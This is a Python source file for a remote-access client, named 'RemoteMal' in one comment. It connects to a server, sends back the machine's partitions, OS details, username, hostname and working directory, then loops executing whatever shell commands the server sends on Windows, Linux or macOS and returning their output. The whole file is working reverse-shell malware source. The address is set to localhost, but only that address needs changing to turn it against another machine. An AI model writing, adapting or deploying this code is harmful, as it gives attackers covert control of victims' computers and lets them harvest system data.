import socket
import subprocess
import os
import sys
import platform
import time
import psutil
import getpass
import shlex
class RemoteClient(object):

    def __init__(self,Ip,PortId,CharSet="utf-16",Buffering=1024):
       self.Ip=Ip                   #Ipv4 Address Where  The Socket Server Need To Run
       self.PortId=PortId           #Port ID of the Socket Server Need To Run
       self.Address=(Ip,PortId)     #Address Where The Socket Sever Need To Run
       self.CharSet=CharSet         #Character Set For Encoding And Decoding
       self.Buffering=Buffering     #Buffering For Data Transmission (Increase Buffering Consume More Memory And High Speed Of Data Transmission via)

    def Connect(self):
        #Connect To The Server:
        self.client_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)    
        self.client_socket.connect(self.Address)

    def send(self,data):
        #Send data as chunks 
        for i in range(0,len(data),self.Buffering):
            chunk =data[i:i+self.Buffering]
            if chunk=="EOF":
                self.client_socket.send(chunk.lower().encode(self.CharSet))
            else:
                self.client_socket.send(chunk.encode(self.CharSet))
        
        #Delay before sending data end
        time.sleep(1)
        self.client_socket.send("EOF".encode(self.CharSet))
        time.sleep(1)
        #Delay after sending data end
        return None

    def recv(self):
        #recieve data as chunks
        data=""
        while True:
            chunk=self.client_socket.recv(self.Buffering).decode(self.CharSet)
            if chunk=="EOF":            #check for the <EndOfFile> to determine data end
                break
            else:
                data+=chunk
        return data

    def GetBuffer(self):
        #Recieve the Buffer From Server Side
        return self.recv() 

    def SetBuffer(self):
        #Change The Value Of Buffering
        self.Buffering=int(self.GetBuffer())

    def LocationOfFile(self):
        #Send The  Location of the <client>  File Downloaded Path
        self.path=os.getcwd()
        self.send(self.path)
        return None

    def Partitions(self):
        #Get the Partitions of the system
        partitions,mountpoints="",""
        for partition in psutil.disk_partitions():
                partitions+=partition.device
                mountpoints+=partition.mountpoint
        self.send(partitions)
        self.send(mountpoints)

    def PartitionsInfo(self):
        #Get the Partitions information such as Name,Mountpoint,(Fixed,Removed),MemorySize
        partitions_info=""
        for partition in psutil.disk_partitions():
            try:
                Memory_size=psutil.disk_usage(partition.mountpoint).total/(1024*1024*1024)
            except OSError:
                Memory_size=-1
            partitions_info+=f"{partition.device}\t{partition.mountpoint}\t{partition.opts}\t{int(Memory_size)}"+"\n"
        self.send(partitions_info)

    def SysPlatform(self):
        #Retrieve the System platform of the client
        #Windows - win32 , Linux -linux ,Mac -darwin
        self.platform=sys.platform
        self.send(self.platform)

    def SysInfo(self):
        #Retrieve the System information of the client
        Info=f"""System<:>{platform.system()}<,>Release<:>{platform.release()}<,>Version<:>{platform.version()}<,>Architecture<:>{platform.machine()}\nProcessor<:>{platform.processor()}<,>Physical Cores<:>{os.cpu_count()}<,>Total Cores<:>{os.cpu_count()}"""
        self.send(Info)

    def GetUserAndDevice(self):
        #Get the User name and Device of the Current User
        self.send(getpass.getuser())
        self.send(platform.node())


    def VerifyPath(self):
        #check whether the path is correct or not
        path=self.recv()
        try:
            os.chdir(path)
            self.path=path 
            self.send("TRUE")
        except Exception as e:
            self.send("FALSE")
    
    def close(self)->None:
        #close the socket connection.
        self.client_socket.close()
        sys.exit(0)         #Exit the program with success code 0
        return None


    def _exe_cmd(self,cmd,input="\n"):

        cmd_list=shlex.split(cmd)
        try:
            #Creating a new process for remote command execution 
            self.process=subprocess.Popen(["cmd.exe","/c"]+cmd_list,universal_newlines=True,cwd=self.path,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            stdout,stderr=self.process.communicate(input=input)
            #Sends the output if the command has any output 
            #sends the error if the command has any error
            #Sends <Command Executed successfully> if no output or error for the executed command
            self.send(stdout) if (stdout) else self.send(stderr) if (stderr) else self.send("Command Executed Sucessfully")

        except Exception as error:
            self.send(str(error))

    def _exe_Terminal(self,cmd,input="\n"):

        #split command based on shell input
        cmd_list=shlex.split(cmd)
        try:
            #Creating a new process for remote command execution 
            self.process=subprocess.Popen(cmd_list,universal_newlines=True,cwd=self.path,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            stdout,stderr=self.process.communicate(input=input)
            #Sends the output if the command has any output 
            #sends the error if the command has any error
            #Sends <Command Executed successfully> if no output or error for the executed command   
            self.send(stdout) if (stdout) else self.send(stderr) if (stderr) else self.send("Command Executed Sucessfully")

        except Exception as error:
            self.send(error.__str__())

    

    def main(self):
        #Entry Point of the Program

        if(self.platform=="win32"):
            
            #The code Block windows command execution
            while(True):

                r.PartitionsInfo() #Sends the Partition information recursively to check whether any partition is addedor removed 

                cmd=self.recv() #Recieve the command to be executed
                
                if (cmd.split()[0]=="cd" and len(cmd.split())>=2): #Check wheather the contains cd (change directory) for directory navigation
                        self.VerifyPath()      #It sets path variable to its previous state if path is not valid   

                elif(cmd.lower()=="remotequit"):
                    self.close()    #Close the Socket Connection.

                else:
                    flag=self.recv()     #Recieve the flag(Y or N) to verify the command needs input or not

                    if (flag.upper()=="Y"):
                        stdin=self.recv()
                        self._exe_cmd(cmd,stdin+"\n") # Execute the command with input
                    else:
                        self._exe_cmd(cmd) #Execute the command without input


        elif(self.platform=="linux" or self.platform=="darwin"):

            #The code Block linux or Mac command execution
            while(True):

                r.PartitionsInfo()#Sends the Partition information recursively to check whether any partition is addedor removed 

                cmd=self.recv() #Recieve the command to be executed


                if (cmd.split()[0]=="cd" and len(cmd.split())>=2): #Check wheather the contains cd (change directory) for directory navigation
                    self.VerifyPath()      #It sets path variable to its previous state if path is not valid   

                elif(cmd.lower()=="remotequit"):
                    self.close()    #Close the Socket Connection.

                else:
                    flag=self.recv()     #Recieve the flag(Y or N) to verify the command needs input or not

                    if (flag.upper()=="Y"):
                        self._exe_Terminal(cmd,self.recv()+"\n") # Execute the command with input
                    else:
                        self._exe_Terminal(cmd) #Execute the command without input
                
        else:
            #RemoteMal Can only work on (Windows,linux,mac) Any other platform will not be Accepted
            self.close() #Close the connection between client and server







        
if __name__=="__main__":
    r=RemoteClient("127.0.0.1",6778)
    r.Connect()
    r.SetBuffer()
    r.Partitions()
    r.LocationOfFile()
    r.SysPlatform()
    r.SysInfo()
    r.PartitionsInfo()
    r.GetUserAndDevice()
    r.main()
#######################################################################################################################################